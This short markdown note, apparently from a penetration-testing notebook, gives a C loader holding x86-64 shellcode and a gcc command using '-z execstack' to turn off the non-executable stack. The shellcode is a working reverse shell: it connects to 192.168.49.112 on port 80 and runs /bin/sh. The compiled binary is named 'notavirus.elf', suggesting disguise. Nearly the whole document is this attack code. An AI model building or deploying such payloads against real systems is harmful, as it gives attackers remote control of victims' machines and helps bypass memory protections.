# Simple ELF Shellcode

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x00\x50\xc0\xa8\x31\x70\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

int main (int argc, char **argv)
{
        int (*ret)() = (int(*)())buf;
        ret();

}
```

Normally our shellcode execution would be blocked as the stack is marked as non-executable for binaries compiled by modern versions of gcc.

We can explicitly allow it with the -z execstack parameter.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ gcc notavirus.c -o notavirus.elf -z execstack
```